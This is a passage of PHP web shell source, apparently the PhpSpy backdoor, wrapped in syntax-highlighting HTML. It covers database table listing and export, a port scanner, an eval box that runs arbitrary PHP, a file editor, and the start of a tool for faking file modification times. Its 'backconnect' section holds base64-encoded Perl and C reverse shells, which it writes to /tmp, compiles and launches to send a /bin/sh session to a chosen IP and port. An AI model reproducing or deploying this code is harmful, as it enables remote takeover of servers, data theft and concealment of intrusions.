#2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($highver) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$table['Engine'].'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$table['Collation'].'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;&lt;a href=\"javascript:settable(\\''.$table['Name'].'\\', <span style=\"text-decoration: underline;\">\\'insert\\');\"&gt;Insert&lt;/a&gt; | &lt;a href=\"javascript:settable(\\''.$table['Name'].'\\', \\'structure\\');\"&gt;Structure&lt;/a&gt; | &lt;a href=\"javascript:settable(\\''.$table['Name'].'\\', \\'drop\\');\"&gt;Drop&lt;/a&gt;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/tr&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class=\"head\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td width=\"2%\" align=\"center\"&gt;&lt;input name=\"chkall\" value=\"on\"<span style=\"text-decoration: underline;\"> type=\"checkbox\" onclick=\"CheckAll(this.form)\" /&gt;&lt;/td&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Name&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Rows&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Data_length&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Create_time&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Update_time&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($highver) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Engine&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Collation&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Operate&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/tr&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;tr class='.bg().'&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;Total tables: '.$table_num.'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$table_rows.'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td&gt;'.$data_size.'&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;td colspan=\"'.($highver ? 5 : 3).'\"&gt;&amp;nbsp;&lt;/td&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/tr&gt;');\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;tr class=\\\"\".bg().\"\\\"&gt;&lt;td colspan=\\\"\".($highver ? 9 : 7).\"\\\"<span style=\"text-decoration: underline;\">&gt;&lt;input name=\\\"saveasfile\\\" value=\\\"1\\\" type=\\\"checkbox\\\" /&gt; Save as file &lt;input class=\\\"input\\\" name=\\\"path\\\" value=\\\"\".SA_ROOT.$dbname.\".sql\\\" type=\\\"text\\\" size=\\\"60\\\" /&gt; &lt;input class=\\\"bt\\\" type=\\\"submit\\\" value=\\\"Export selection table\\\" /&gt;&lt;/td&gt;&lt;/tr&gt;\");</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('doing','backupmysql');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p(\"&lt;/table&gt;\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fr($query);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   tbfoot();\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @mysql_close();\n}//end mysql\n\nelseif ($action == 'backconnect') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$yourip &amp;&amp; $yourip = $_SERVER['REMOTE_ADDR'];\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$yourport &amp;&amp; $yourport = '12345';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $usedb = array('perl'=&gt;'perl','c'=&gt;'c');\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $back_connect=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ<span style=\"text-decoration: underline;\">HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj\".</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   \"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9<span style=\"text-decoration: underline;\">ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR\".</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   \"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3<span style=\"text-decoration: underline;\">J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT\".</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   \"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JT<span style=\"text-decoration: underline;\">kVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI\".</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   \"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9y<span style=\"text-decoration: underline;\">OiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi\".</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   \"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQ<span style=\"text-decoration: underline;\">iKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl\".</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   \"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $back_connect_c=\"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0<span style=\"text-decoration: underline;\">KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC\".</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   \"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb<span style=\"text-decoration: underline;\">2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb\".</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   \"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQog<span style=\"text-decoration: underline;\">c2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd\".</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   \"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnp<span style=\"text-decoration: underline;\">lcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ\".</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   \"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSV<span style=\"text-decoration: underline;\">BQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC\".</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   \"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8M<span style=\"text-decoration: underline;\">Ckgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D\".</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   \"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1z<span style=\"text-decoration: underline;\">KTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp\".</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   \"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiB<span style=\"text-decoration: underline;\">jbG9zZShmZCk7IA0KfQ==\";</span>\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($start &amp;&amp; $yourip &amp;&amp; $yourport &amp;&amp; $use){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($use == 'perl') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   cf('/tmp/angel_bc',$back_connect);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &amp;\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   cf('/tmp/angel_bc.c',$back_connect_c);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @unlink('/tmp/angel_bc.c');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $res = execute(\"/tmp/angel_bc $yourip $yourport &amp;\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   m(\"Now script try connect to $yourip port $yourport ...\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('title'=&gt;'Back Connect'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','backconnect');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('Your IP:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'yourip','size'=&gt;20,'value'=&gt;$yourip));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('Your Port:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'yourport','size'=&gt;15,'value'=&gt;$yourport));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('Use:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeselect(array('name'=&gt;'use','option'=&gt;$usedb,'selected'=&gt;$use));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'start','value'=&gt;'Start','type'=&gt;'submit','class'=&gt;'<span style=\"text-decoration: underline;\">bt'));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n}//end\n\nelseif ($action == 'portscan') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$scanip &amp;&amp; $scanip = '127.0.0.1';\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   !$scanport &amp;&amp; $scanport = '21,25,80,110,135,139,445,1433,3306,3389,5631,4395<span style=\"text-decoration: underline;\">8';</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('title'=&gt;'Port Scan'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','portscan');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('IP:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'scanip','size'=&gt;20,'value'=&gt;$scanip));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('Port:');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'scanport','size'=&gt;80,'value'=&gt;$scanport));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('name'=&gt;'startscan','value'=&gt;'Scan','type'=&gt;'submit','class'<span style=\"text-decoration: underline;\">=&gt;'bt'));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/p&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfoot();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if ($startscan) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;h2&gt;Result &amp;raquo;&lt;/h2&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;ul class=\"info\"&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   foreach(explode(',', $scanport) as $port) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $fp = @fsockopen($scanip, $port, &amp;$errno, &amp;$errstr, 1);<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!$fp) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;li&gt;'.$scanip.':'.$port.' ------------------------ &lt;span styl<span style=\"text-decoration: underline;\">e=\"font-weight:bold;color:#f00;\"&gt;Close&lt;/span&gt;&lt;/li&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  } else {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;li&gt;'.$scanip.':'.$port.' ------------------------ &lt;span styl<span style=\"text-decoration: underline;\">e=\"font-weight:bold;color:#080;\"&gt;Open&lt;/span&gt;&lt;/li&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @fclose($fp);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>  }<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;/ul&gt;');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}\n\nelseif ($action == 'eval') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $phpcode = trim($phpcode);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if($phpcode){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if (!preg_match('#&lt;\\?#si', $phpcode)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $phpcode = \"&lt;?php\\n\\n{$phpcode}\\n\\n?&gt;\";\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   eval(\"?\".\"&gt;$phpcode&lt;?\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('title'=&gt;'Eval PHP Code'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','eval');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   maketext(array('title'=&gt;'PHP Code','name'=&gt;'phpcode', 'value'=&gt;$phpcode));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   p('&lt;p&gt;&lt;a href=\"http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/\" target=\"_bla<span style=\"text-decoration: underline;\">nk\"&gt;Get plugins&lt;/a&gt;&lt;/p&gt;');</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfooter();\n}//end eval\n\nelseif ($action == 'editfile') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   if(file_exists($opfile)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $fp=@fopen($opfile,'r');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $contents=@fread($fp, filesize($opfile));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   @fclose($fp);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $contents=htmlspecialchars($contents);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('title'=&gt;'Create / Edit File'));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('action','file');\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makehide('dir',$nowpath);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   makeinput(array('title'=&gt;'Current File (import new file name and new file)',<span style=\"text-decoration: underline;\">'name'=&gt;'editfilename','value'=&gt;$opfile,'newline'=&gt;1));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   maketext(array('title'=&gt;'File Content','name'=&gt;'filecontent','value'=&gt;$conte<span style=\"text-decoration: underline;\">nts));</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formfooter();\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   goback();\n\n}//end editfile\n\nelseif ($action == 'newtime') {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $opfilemtime = @filemtime($opfile);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   //$time = strtotime(\"$year-$month-$day $hour:$minute:$second\");\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   $cachemonth = array('January'=&gt;1,'February'=&gt;2,'March'=&gt;3,'April'=&gt;4,'May'=&gt;<span style=\"text-decoration: underline;\">5,'June'=&gt;6,'July'=&gt;7,'August'=&gt;8,'September'=&gt;9,'October'=&gt;10,'November'=&gt;11,'December'=&gt;12);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   formhead(array('title'=&gt;'Clone folder/file was last modified 